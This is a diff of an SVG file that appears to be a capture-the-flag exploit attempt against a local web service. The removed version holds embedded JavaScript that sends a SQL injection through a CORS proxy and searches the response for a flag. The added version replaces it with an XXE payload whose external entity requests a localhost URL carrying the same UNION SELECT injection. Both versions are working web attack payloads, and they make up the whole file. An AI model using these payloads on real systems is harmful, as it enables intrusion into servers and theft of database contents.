@@ -1,19 +1,9 @@
-<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
-  <circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="green"/>
-  <script><![CDATA[
-    async function trySQLInjection() {
-      try {
-        const sqlQuery = "' UNION SELECT name, sql FROM sqlite_master WHERE type='table' --";
-        const searchResp = await fetch('https://cors-anywhere.herokuapp.com/https://localhost:8001/f/search?q=' + encodeURIComponent(sqlQuery));
-        const searchData = await searchResp.text();
-        alert('Search endpoint response: ' + searchData);
-        if (searchData.includes('_') && searchData.includes('flag_')) {
-          alert('Found promising data in search response!');
-        }
-      } catch (e) {
-        alert('Error with search endpoint: ' + e.message);
-      }
-    }
-    trySQLInjection();
-  ]]></script>
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+  <!ENTITY % xxe SYSTEM "http://localhost:8001/search?q=') UNION SELECT name, sql FROM sqlite_master WHERE type='table' --">
+  %xxe;
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="1000" height="1000">
+  <rect width="1000" height="1000" fill="white"/>
+  <text x="10" y="50" font-size="12" fill="black">XXE Exploit</text>
 </svg>
